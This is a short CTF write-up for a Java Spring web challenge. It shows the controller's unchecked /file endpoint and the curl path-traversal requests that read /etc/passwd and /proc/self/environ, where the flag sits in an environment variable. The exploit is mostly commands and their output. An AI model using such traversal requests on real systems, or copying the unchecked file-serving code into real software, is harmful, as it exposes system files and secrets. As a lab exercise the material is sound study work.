# Under construction

We are building a new IA that will revolutionize the world of CTF competitions. Thanks to FlagGPT, you can be the script kiddie you always wanted to be.
http://chall-server-1.numa.host:8082/

## Solucion

- Nos daban una aplicacion web en JAva, teniamos que averiguar como obtener la bandera
- aprovechamos un Path Trasversal

```
package metared.spain.challs.underconstruction;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;

@Controller
public class Web {
    public static final String STATIC_PATH = "/app/src/main/resources/static/";
    private static Logger logger = LoggerFactory.getLogger(Web.class);

    @GetMapping("/")
    @ResponseBody
    public byte[] index() throws IOException {
        // https://media.giphy.com/media/ANbD1CCdA3iI8/giphy.gif
        return Files.readAllBytes(Path.of(STATIC_PATH, "index.html"));
    }

    @GetMapping("/healthcheck")
    @ResponseBody
    public String healthcheck(){
        logger.info("Health ok");
        return "Health ok";
    }

    @GetMapping("/file")
    @ResponseBody
    public byte[] serveFile(@RequestParam String filename) throws IOException {
        logger.info("Serving file: {}", filename);
        return Files.readAllBytes(Path.of(STATIC_PATH, filename));
    }
}

```

```
curl http://chall-server-1.numa.host:8082/file\?filename\=../banner.txt
  __  __      _                     _  _____ _______ ______
 |  \/  |    | |                   | |/ ____|__   __|  ____|
 | \  / | ___| |_ __ _ _ __ ___  __| | |       | |  | |__

 | |\/| |/ _ \ __/ _` | '__/ _ \/ _` | |       | |  |  __|
 | |  | |  __/ || (_| | | |  __/ (_| | |____   | |  | |
 |_|  |_|\___|\__\__,_|_|  \___|\__,_|\_____|  |_|  |_|
```


```
curl http://chall-server-1.numa.host:8082/file\?filename\=../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```


```
derconstruction curl http://chall-server-1.numa.host:8082/file\?filename\=../../../../../proc/self/environ
Warning: Binary output can mess up your terminal. Use "--output -" to tell
Warning: curl to output it to your terminal anyway, or consider "--output
Warning: <FILE>" to save to a file.
➜  uderconstruction curl http://chall-server-1.numa.host:8082/file\?filename\=../../../../../proc/self/environ --output x
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   389  100   389    0     0   1062      0 --:--:-- --:--:-- --:--:--  1062
➜  uderconstruction cat x
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANGUAGE=en_US:enJAVA_HOME=/opt/java/openjdkMAVEN_PROJECTBASEDIR=/appOLDPWD=/appLANG=en_US.UTF-8MAVEN_HOME=/usr/share/mavenHOSTNAME=63640a3a7d2cLC_ALL=en_US.UTF-8PWD=/appJAVA_VERSION=jdk-17.0.8.1+1CHALLENGE_FLAG=flag{Fl4gGPT_wh3r3_1s_my_fl4g}MAVEN_CMD_LINE_ARGS= spring-boot:runHOME=/root%
```